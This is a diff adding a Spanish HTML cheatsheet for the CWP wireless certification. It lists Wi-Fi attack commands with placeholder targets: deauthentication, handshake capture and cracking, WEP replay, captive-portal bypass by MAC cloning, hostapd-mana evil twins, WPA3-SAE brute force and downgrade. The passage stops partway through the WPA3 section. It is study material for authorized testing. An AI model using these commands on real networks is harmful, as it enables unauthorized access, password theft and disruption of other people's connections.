@@ -1,0 +1,1194 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#050510">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>CWP Cheatsheet - Wi-Fi Hacking | Guarina0x0</title>
+    <meta name="description" content="CWP (Certified Wireless Professional) - Cheatsheet completa de ataques Wi-Fi: Aircrack-ng, WEP, WPA/WPA2-PSK, WPA3-SAE, Evil Twin, MGT, Relay Attacks y m&aacute;s.">
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="manifest" href="manifest.json">
+    <link rel="canonical" href="https://guarina0x0.github.io/cwp-cheatsheet.html">
+    <meta property="og:url" content="https://guarina0x0.github.io/cwp-cheatsheet.html">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="CWP Cheatsheet - Wi-Fi Hacking | Guarina0x0">
+    <meta property="og:description" content="CWP (Certified Wireless Professional) - Cheatsheet completa de ataques Wi-Fi: Aircrack-ng, WEP, WPA/WPA2-PSK, WPA3-SAE, Evil Twin, MGT, Relay Attacks y mas.">
+    <meta property="og:site_name" content="Guarina0x0">
+    <meta name="twitter:title" content="CWP Cheatsheet - Wi-Fi Hacking | Guarina0x0">
+    <meta name="twitter:description" content="CWP (Certified Wireless Professional) - Cheatsheet completa de ataques Wi-Fi: Aircrack-ng, WEP, WPA/WPA2-PSK, WPA3-SAE, Evil Twin, MGT, Relay Attacks y mas.">
+    <meta property="og:image" content="https://guarina0x0.github.io/og-image.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://guarina0x0.github.io/og-image.png">
+    <meta name="twitter:site" content="@Guarina0x0">
+    <meta name="twitter:creator" content="@Guarina0x0">
+    <meta property="og:locale" content="es_ES">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:alt" content="CWP Cheatsheet - Wi-Fi Hacking y Ataques Wireless">
+    <meta name="author" content="Guarina0x0">
+    <meta name="keywords" content="CWP, Certified Wireless Professional, Wi-Fi hacking, aircrack-ng, WEP, WPA, WPA2, WPA3, evil twin, wireless attacks, cheatsheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&family=Exo+2:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "TechArticle",
+        "headline": "CWP Cheatsheet - Wi-Fi Hacking",
+        "description": "CWP (Certified Wireless Professional) - Cheatsheet de Wi-Fi Hacking: Aircrack-ng, WEP, WPA, WPA2, WPA3, Evil Twin y mas.",
+        "author": {"@type": "Person", "name": "Guarina0x0", "url": "https://guarina0x0.github.io"},
+        "publisher": {"@type": "Person", "name": "Guarina0x0"},
+        "url": "https://guarina0x0.github.io/cwp-cheatsheet.html",
+        "datePublished": "2026-02-14",
+        "dateModified": "2026-02-14",
+        "inLanguage": "es",
+        "isPartOf": {
+            "@type": "CollectionPage",
+            "name": "Cheatsheets Arsenal",
+            "url": "https://guarina0x0.github.io/cheatsheets.html"
+        }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+            {"@type": "ListItem", "position": 1, "name": "Portal", "item": "https://guarina0x0.github.io/"},
+            {"@type": "ListItem", "position": 2, "name": "Cheatsheets", "item": "https://guarina0x0.github.io/cheatsheets.html"},
+            {"@type": "ListItem", "position": 3, "name": "CWP - Wi-Fi Hacking"}
+        ]
+    }
+    </script>
+    <link rel="stylesheet" href="styles.css">
+    <script>(function(){var t=localStorage.getItem('theme');if(t)document.documentElement.setAttribute('data-theme',t);})()</script>
+</head>
+<body>
+<a href="#main-content" class="skip-link">Saltar al contenido</a>
+<div class="reading-progress" id="readingProgress"></div>
+
+<div class="grid-overlay"></div>
+
+<!-- Nav -->
+<nav class="nav" id="nav">
+    <a href="/" class="nav-brand">
+        <div class="nav-logo"><span>G</span></div>
+        <span class="nav-title">GUARINA0x0</span>
+    </a>
+    <ul class="nav-links" id="navLinks">
+        <li><a href="/">Portal</a></li>
+        <li><a href="/#categorias">Categor&iacute;as</a></li>
+        <li><a href="cheatsheets.html">Cheatsheets</a></li>
+        <li><a href="https://github.com/Guarina0x0" target="_blank" rel="noopener noreferrer">GitHub</a></li>
+    </ul>
+    <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+        <svg class="icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+    </button>
+    <button class="search-trigger" id="searchTrigger" aria-label="Search">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        <kbd>Ctrl+K</kbd>
+    </button>
+    <div class="nav-hamburger" id="hamburger" role="button" aria-label="Toggle navigation menu" tabindex="0">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</nav>
+
+<!-- Breadcrumbs -->
+<nav class="breadcrumbs" aria-label="Breadcrumb">
+    <a href="/">Portal</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="cheatsheets.html">Cheatsheets</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">CWP</span>
+</nav>
+
+<!-- Hero -->
+<section class="page-hero">
+    <div class="page-hero-tag">// Dimensi&oacute;n C-700 :: Certified Wireless Professional</div>
+    <h1><span class="accent">CWP</span> Cheatsheet</h1>
+    <p class="page-hero-desc">Comandos y t&eacute;cnicas de Wi-Fi Hacking recopilados durante la preparaci&oacute;n y examen del CWP. Desde Recon hasta Relay Attacks en redes Enterprise.</p>
+    <div class="page-hero-badges">
+        <span class="badge">Aircrack-ng</span>
+        <span class="badge">Hashcat</span>
+        <span class="badge">WPA/WPA2-PSK</span>
+        <span class="badge">WPA3-SAE</span>
+        <span class="badge">Enterprise MGT</span>
+        <span class="badge">Evil Twin</span>
+        <span class="badge">Relay Attacks</span>
+    </div>
+    <a class="credential-verify" href="https://www.credential.net/043feaa3-5005-4f2f-ae85-75d0bacc57f8#acc.C6SI9s1x" target="_blank" rel="noopener noreferrer">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+        Verificar Credencial
+    </a>
+</section>
+
+<div class="page-layout">
+
+<!-- Sidebar -->
+<aside class="sidebar" role="complementary" aria-label="Navigation sidebar">
+    <div class="sidebar-title">Contenido</div>
+    <ul class="sidebar-nav">
+        <li><a href="#recon"><span class="num">01</span> Recon &amp; Interface Management</a></li>
+        <li><a href="#aircrack"><span class="num">02</span> Aircrack-ng Suite</a></li>
+        <li><a href="#analysis"><span class="num">03</span> Wi-Fi Analysis &amp; Hidden Networks</a></li>
+        <li><a href="#cracking"><span class="num">04</span> Cracking Passwords</a></li>
+        <li><a href="#opn"><span class="num">05</span> OPN Attacks</a></li>
+        <li><a href="#wep"><span class="num">06</span> WEP Attacks</a></li>
+        <li><a href="#psk"><span class="num">07</span> WPA/WPA2-PSK Attacks</a></li>
+        <li><a href="#eviltwin"><span class="num">08</span> Evil Twin - PSK</a></li>
+        <li><a href="#sae"><span class="num">09</span> WPA3-SAE Attacks</a></li>
+        <li><a href="#mgtrecon"><span class="num">10</span> MGT Recon</a></li>
+        <li><a href="#mgteviltwin"><span class="num">11</span> MGT - Evil Twin &amp; MiTM</a></li>
+        <li><a href="#mgtbrute"><span class="num">12</span> MGT - Brute Force &amp; Spraying</a></li>
+        <li><a href="#mgtrelay"><span class="num">13</span> MGT - Relay Attacks</a></li>
+        <li><a href="#mgtrogue"><span class="num">14</span> MGT - Rogue AP &amp; Certificates</a></li>
+    </ul>
+</aside>
+
+<!-- Main Content -->
+<main class="content" id="main-content" role="main">
+
+<!-- 01 RECON & INTERFACE MANAGEMENT -->
+<div class="section-block reveal" id="recon">
+    <div class="section-number">// 01</div>
+    <h2>Recon &amp; <span class="accent">Interface Management</span></h2>
+
+    <h3>Gesti&oacute;n de Interfaces</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Configurar interfaz en un canal espec&iacute;fico</span>
+iwconfig wlan0mon channel &lt;CHANNEL&gt;
+
+<span class="comment"># Deshabilitar el gestor de interfaces</span>
+sudo systemctl stop NetworkManager
+
+<span class="comment"># Verificar modo monitor</span>
+iwconfig
+
+<span class="comment"># Monitorizar con tcpdump</span>
+sudo tcpdump -i wlan0mon -w &lt;OUTPUT_FILE&gt;.cap
+
+<span class="comment"># Reactivar la interfaz</span>
+sudo ifconfig wlan0 up</pre></div>
+    </div>
+
+    <h3>Habilitar Modo Monitor</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Desactivar la interfaz</span>
+sudo ip link set wlan0 down
+
+<span class="comment"># Cambiar a modo monitor</span>
+sudo iwconfig wlan0 mode monitor
+
+<span class="comment"># Reactivar la interfaz</span>
+sudo ip link set wlan0 up</pre></div>
+    </div>
+
+    <h3>Cambiar Direcci&oacute;n MAC</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Establecer una MAC espec&iacute;fica</span>
+sudo ifconfig wlan0 down
+ip link set wlan0 down
+ip link set dev wlan0 address &lt;NEW_MAC&gt;
+ip link set wlan0 up
+
+<span class="comment"># Establecer una MAC aleatoria</span>
+sudo macchanger -r wlan0
+sudo macchanger -m &lt;NEW_MAC&gt; wlan0</pre></div>
+    </div>
+</div>
+
+<!-- 02 AIRCRACK-NG SUITE -->
+<div class="section-block reveal" id="aircrack">
+    <div class="section-number">// 02</div>
+    <h2><span class="accent">Aircrack-ng</span> Suite</h2>
+
+    <h3>Modo Monitor &amp; Comandos B&aacute;sicos</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Activar modo monitor</span>
+sudo airmon-ng start wlan0
+
+<span class="comment"># Matar procesos que interfieren</span>
+sudo airmon-ng check kill
+
+<span class="comment"># Capturar paquetes</span>
+sudo airodump-ng wlan0mon
+
+<span class="comment"># Volver a modo gestionado</span>
+sudo airmon-ng stop wlan0mon</pre></div>
+    </div>
+
+    <h3>Inyecci&oacute;n de Paquetes</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Probar soporte para inyecci&oacute;n</span>
+sudo aireplay-ng --test wlan0
+
+<span class="comment"># Realizar inyecci&oacute;n ARP replay</span>
+sudo aireplay-ng -3 -b &lt;TARGET_BSSID&gt; -h &lt;YOUR_MAC&gt; wlan0</pre></div>
+    </div>
+
+    <h3>Airodump-ng - Captura de Datos</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Iniciar captura de datos</span>
+sudo airodump-ng wlan0mon
+
+<span class="comment"># Escanear todo (2.4GHz + 5GHz)</span>
+sudo airodump-ng --band abg -w &lt;OUTPUT_FILE&gt; --gpsd wlan0mon
+
+<span class="comment"># Solo un canal espec&iacute;fico</span>
+sudo airodump-ng -c &lt;CHANNEL&gt; -w &lt;OUTPUT_FILE&gt; wlan0mon
+
+<span class="comment"># An&aacute;lisis completo con manufacturer y WPS</span>
+sudo airodump-ng wlan0mon -w &lt;OUTPUT_FILE&gt; --manufacturer --wps --band abg</pre></div>
+    </div>
+</div>
+
+<!-- 03 WI-FI ANALYSIS & HIDDEN NETWORKS -->
+<div class="section-block reveal" id="analysis">
+    <div class="section-number">// 03</div>
+    <h2>Wi-Fi Analysis &amp; <span class="accent">Hidden Networks</span></h2>
+
+    <h3>Detecci&oacute;n de Redes Ocultas</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Detectar con iwlist</span>
+sudo iwlist wlan0 scan
+
+<span class="comment"># Detectar con airodump-ng</span>
+sudo airodump-ng wlan0mon
+
+<span class="comment"># Brute force SSIDs ocultos con mdk4</span>
+mdk4 wlan0mon p -t &lt;BSSID&gt; -f &lt;ESSID_DICTIONARY&gt;</pre></div>
+    </div>
+
+    <h3>Wi-Fi DB - Base de Datos de Redes</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Crear base de datos desde capturas</span>
+python3 wifi_db.py -d database.sqlite &lt;CAPTURE_DIR&gt;/
+
+<span class="comment"># Abrir base de datos para an&aacute;lisis</span>
+sqlitebrowser database.sqlite</pre></div>
+    </div>
+</div>
+
+<!-- 04 CRACKING PASSWORDS -->
+<div class="section-block reveal" id="cracking">
+    <div class="section-number">// 04</div>
+    <h2>Cracking <span class="accent">Passwords</span></h2>
+
+    <h3>Cracking WPA/WPA2-PSK</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Hashcat - modo 22000 (WPA-PBKDF2-PMKID+EAPOL)</span>
+hashcat -m 22000 &lt;HASH_FILE&gt;.hccapx -a 0 -w 3 &lt;WORDLIST&gt;
+
+<span class="comment"># Aircrack-ng con wordlist</span>
+aircrack-ng -w &lt;WORDLIST&gt; -b &lt;BSSID&gt; &lt;CAPTURE_FILE&gt;.cap
+
+<span class="comment"># Aircrack-ng sin especificar BSSID</span>
+aircrack-ng -w &lt;WORDLIST&gt; &lt;CAPTURE_FILE&gt;.cap</pre></div>
+    </div>
+
+    <h3>Cracking MSCHAPv2 (Enterprise)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Hashcat - MSCHAPv2 (NetNTLMv1)</span>
+hashcat -m 5500 &lt;HASH_FILE&gt; -a 0 -w 3 &lt;WORDLIST&gt;
+
+<span class="comment"># John the Ripper</span>
+john --format=netntlm &lt;HASH_FILE&gt;</pre></div>
+    </div>
+
+    <h3>Cracking NTLMv2 (Responder)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Hashcat - NTLMv2</span>
+hashcat -a 0 -m 5600 &lt;HASH_FILE&gt; &lt;WORDLIST&gt; --force</pre></div>
+    </div>
+
+    <h3>Conversi&oacute;n de Formatos de Hash</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Convertir hccapx a formato 22000</span>
+hcxhash2cap --hccapx=&lt;INPUT&gt;.hccapx -c &lt;OUTPUT&gt;.pcap
+hcxpcapngtool &lt;OUTPUT&gt;.pcap -o &lt;HASH_FILE&gt;.22000
+
+<span class="comment"># Convertir pcap a hash 22000</span>
+hcxpcapngtool &lt;CAPTURE&gt;.cap -o &lt;HASH_FILE&gt;.22000</pre></div>
+    </div>
+</div>
+
+<!-- 05 OPN ATTACKS -->
+<div class="section-block reveal" id="opn">
+    <div class="section-number">// 05</div>
+    <h2><span class="accent">OPN</span> Attacks (Redes Abiertas)</h2>
+
+    <h3>Enumerar Redes Abiertas</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Enumerar redes</span>
+sudo airodump-ng wlan0
+
+<span class="comment"># Capturar tr&aacute;fico de un AP espec&iacute;fico</span>
+sudo airodump-ng --bssid &lt;BSSID&gt; --channel &lt;CH&gt; wlan0</pre></div>
+    </div>
+
+    <h3>Bypass de Portal Cautivo</h3>
+    <div class="note">Se identifica un portal cautivo al conectarse. Se deben listar clientes leg&iacute;timos del AP para clonar su MAC y bypass la autenticaci&oacute;n.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Archivo de configuraci&oacute;n para red abierta (open.conf)</span>
+network={
+  ssid="&lt;NETWORK_SSID&gt;"
+  key_mgmt=NONE
+}
+
+<span class="comment"># Capturar tr&aacute;fico para encontrar clientes leg&iacute;timos</span>
+sudo airodump-ng wlan0mon -w &lt;OUTPUT&gt; --manufacturer --wps -c &lt;CHANNEL&gt;
+
+<span class="comment"># Clonar MAC de un cliente leg&iacute;timo</span>
+systemctl stop network-manager
+ip link set &lt;IFACE&gt; down
+sudo macchanger -m &lt;LEGIT_CLIENT_MAC&gt; &lt;IFACE&gt;
+ip link set &lt;IFACE&gt; up
+
+<span class="comment"># Conectarse con la MAC clonada</span>
+wpa_supplicant -i &lt;IFACE&gt; -c open.conf
+sudo dhclient -v &lt;IFACE&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 06 WEP ATTACKS -->
+<div class="section-block reveal" id="wep">
+    <div class="section-number">// 06</div>
+    <h2><span class="accent">WEP</span> Attacks</h2>
+
+    <h3>Ataques B&aacute;sicos WEP</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Autenticaci&oacute;n falsa</span>
+aireplay-ng -1 0 -a &lt;AP_MAC&gt; -h &lt;CLIENT_MAC&gt; &lt;IFACE&gt;
+
+<span class="comment"># Ataque de repetici&oacute;n ARP (arpreplay)</span>
+aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;CLIENT_MAC&gt; &lt;IFACE&gt;
+
+<span class="comment"># Ataque de desautenticaci&oacute;n</span>
+aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;CLIENT_MAC&gt; &lt;IFACE&gt;</pre></div>
+    </div>
+
+    <h3>Ataque Completo: Inyecci&oacute;n + Captura</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># 1. Habilitar modo monitor</span>
+sudo airmon-ng start wlan0
+
+<span class="comment"># 2. Monitorizar la red WEP</span>
+sudo airodump-ng -c &lt;CHANNEL&gt; --bssid &lt;BSSID&gt; -w &lt;OUTPUT&gt; wlan0mon
+
+<span class="comment"># 3. Autenticaci&oacute;n falsa para generar tr&aacute;fico</span>
+sudo aireplay-ng -1 3600 -q 10 -a &lt;BSSID&gt; wlan0mon
+
+<span class="comment"># 4. Ataque ARP replay (en paralelo)</span>
+sudo aireplay-ng --arpreplay -b &lt;BSSID&gt; -h &lt;YOUR_MAC&gt; wlan0mon
+
+<span class="comment"># 5. Descifrar la contrase&ntilde;a</span>
+sudo aircrack-ng &lt;OUTPUT&gt;-01.cap</pre></div>
+    </div>
+
+    <h3>M&eacute;todo R&aacute;pido con besside-ng</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># M&eacute;todo alternativo autom&aacute;tico</span>
+airmon-ng check kill
+besside-ng -c &lt;CHANNEL&gt; -b &lt;BSSID&gt; &lt;IFACE&gt; -v</pre></div>
+    </div>
+
+    <h3>Conexi&oacute;n a Red WEP</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Archivo wep.conf</span>
+network={
+    ssid="&lt;NETWORK_SSID&gt;"
+    key_mgmt=NONE
+    wep_key0=&lt;WEP_PASSWORD&gt;
+    wep_tx_keyidx=0
+}
+
+<span class="comment"># Conectarse</span>
+wpa_supplicant -i &lt;IFACE&gt; -c wep.conf
+dhclient &lt;IFACE&gt; -v
+
+<span class="comment"># Alternativa con nmcli</span>
+nmcli dev wifi connect "&lt;NETWORK_SSID&gt;" password "&lt;WEP_PASSWORD&gt;"</pre></div>
+    </div>
+</div>
+
+<!-- 07 WPA/WPA2-PSK ATTACKS -->
+<div class="section-block reveal" id="psk">
+    <div class="section-number">// 07</div>
+    <h2><span class="accent">WPA/WPA2-PSK</span> Attacks</h2>
+
+    <h3>Captura de Handshake + Desautenticaci&oacute;n</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SHELL 1 - Capturar handshake</span>
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon -w &lt;OUTPUT&gt; -c &lt;CHANNEL&gt;
+
+<span class="comment"># SHELL 2 - Forzar desautenticaci&oacute;n</span>
+sudo aireplay-ng -0 10 -a &lt;AP_BSSID&gt; wlan0mon
+
+<span class="comment"># Si no funciona, especificar MAC del cliente</span>
+sudo aireplay-ng -0 10 -a &lt;AP_BSSID&gt; -c &lt;CLIENT_MAC&gt; wlan0mon</pre></div>
+    </div>
+
+    <h3>Cracking del Handshake</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># M&eacute;todo 1: Aircrack-ng</span>
+sudo aircrack-ng &lt;CAPTURE&gt;.cap -w &lt;WORDLIST&gt;
+
+<span class="comment"># M&eacute;todo 2: Hashcat (m&aacute;s r&aacute;pido con GPU)</span>
+sudo hcxpcapngtool &lt;CAPTURE&gt;.cap -o hash.22000
+hashcat -a 0 -m 22000 hash.22000 &lt;WORDLIST&gt; --force</pre></div>
+    </div>
+
+    <h3>Descifrado de Tr&aacute;fico WPA/WPA2-PSK</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Descifrar tr&aacute;fico con contrase&ntilde;a conocida</span>
+sudo airdecap-ng -e &lt;ESSID&gt; -p &lt;PASSWORD&gt; &lt;CAPTURE&gt;.cap
+
+<span class="comment"># Inspeccionar con Wireshark</span>
+sudo wireshark &lt;CAPTURE&gt;-dec.cap
+
+<span class="comment"># Filtrar por HTTP para obtener cookies de sesi&oacute;n</span></pre></div>
+    </div>
+
+    <h3>Conexi&oacute;n a Red WPA/WPA2-PSK</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Archivo psk.conf</span>
+network={
+    ssid="&lt;NETWORK_SSID&gt;"
+    psk="&lt;PASSWORD&gt;"
+    scan_ssid=1
+    key_mgmt=WPA-PSK
+    proto=WPA2
+}
+
+<span class="comment"># Conectarse</span>
+wpa_supplicant -i &lt;IFACE&gt; -c psk.conf
+sudo dhclient &lt;IFACE&gt; -v</pre></div>
+    </div>
+
+    <h3>An&aacute;lisis de Clientes en la Misma Red</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Escanear la red para descubrir hosts y servicios</span>
+sudo nmap -sV &lt;NETWORK_RANGE&gt;
+
+<span class="comment"># Alternativa con arp-scan</span>
+arp-scan -I &lt;IFACE&gt; -l</pre></div>
+    </div>
+</div>
+
+<!-- 08 EVIL TWIN - PSK -->
+<div class="section-block reveal" id="eviltwin">
+    <div class="section-number">// 08</div>
+    <h2><span class="accent">Evil Twin</span> - PSK</h2>
+
+    <div class="note">Se crea un AP falso (Fake AP) que simula la red objetivo. Cuando un cliente intenta conectarse, hostapd-mana captura el handshake para cracking offline.</div>
+
+    <h3>Configurar Fake AP con hostapd-mana</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Archivo hostapd.conf</span>
+interface=&lt;IFACE&gt;
+driver=nl80211
+hw_mode=g
+channel=&lt;CHANNEL&gt;
+ssid=&lt;TARGET_SSID&gt;
+mana_wpaout=hostapd.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+
+<span class="comment"># Iniciar el Fake AP</span>
+sudo hostapd-mana hostapd.conf</pre></div>
+    </div>
+
+    <h3>Cracking del Handshake Capturado</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># M&eacute;todo 1: Hashcat directo (modo 2500 deprecado)</span>
+hashcat -a 0 -m 2500 hostapd.hccapx &lt;WORDLIST&gt; --force
+
+<span class="comment"># M&eacute;todo 2: Convertir a formato 22000</span>
+hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
+hcxpcapngtool aux.pcap -o hash.22000
+hashcat -a 0 -m 22000 hash.22000 &lt;WORDLIST&gt; --force</pre></div>
+    </div>
+</div>
+
+<!-- 09 WPA3-SAE ATTACKS -->
+<div class="section-block reveal" id="sae">
+    <div class="section-number">// 09</div>
+    <h2><span class="accent">WPA3-SAE</span> Attacks</h2>
+
+    <h3>Fuerza Bruta Online contra WPA3-SAE</h3>
+    <div class="note">WPA3-SAE (Simultaneous Authentication of Equals) es resistente a ataques offline. Se requiere fuerza bruta online con herramientas como wacker.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Capturar redes y crear base de datos</span>
+sudo airodump-ng wlan0 -w &lt;OUTPUT_DIR&gt;/ --gpsd
+python3 wifi_db.py -d database.sqlite &lt;OUTPUT_DIR&gt;/
+
+<span class="comment"># Verificar frecuencia del AP</span>
+sudo iwlist wlan0 frequency | grep 'Channel &lt;CH&gt; :'
+
+<span class="comment"># Fuerza bruta con wacker</span>
+./wacker.py --wordlist &lt;WORDLIST&gt; --ssid &lt;TARGET_SSID&gt; --bssid &lt;BSSID&gt; --interface &lt;IFACE&gt; --freq &lt;FREQ_MHZ&gt;</pre></div>
+    </div>
+
+    <h3>Conexi&oacute;n a Red WPA3-SAE</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Archivo sae.conf</span>
+network={
+    ssid="&lt;TARGET_SSID&gt;"
+    psk="&lt;PASSWORD&gt;"
+    key_mgmt=SAE
+    scan_ssid=1
+    ieee80211w=2
+}
+
+<span class="comment"># Conectarse</span>
+sudo wpa_supplicant -i &lt;IFACE&gt; -c sae.conf
+sudo dhclient -v &lt;IFACE&gt;</pre></div>
+    </div>
+
+    <h3>Downgrade + MiTM en Redes WPA2/WPA3</h3>
+    <div class="note">Redes con WPA+PSK, WPA-AES-CCM, WPA-SAE son vulnerables a downgrade. Se fuerza al cliente a conectarse por WPA2 en lugar de WPA3.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Levantar AP falso forzando WPA2 (hostapd-sae.conf)</span>
+interface=&lt;IFACE&gt;
+driver=nl80211
+hw_mode=g
+channel=&lt;CHANNEL&gt;
+ssid=&lt;TARGET_SSID&gt;
+mana_wpaout=hostapd.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+
+<span class="comment"># Ejecutar hostapd-mana</span>
+sudo hostapd-mana hostapd-sae.conf
+
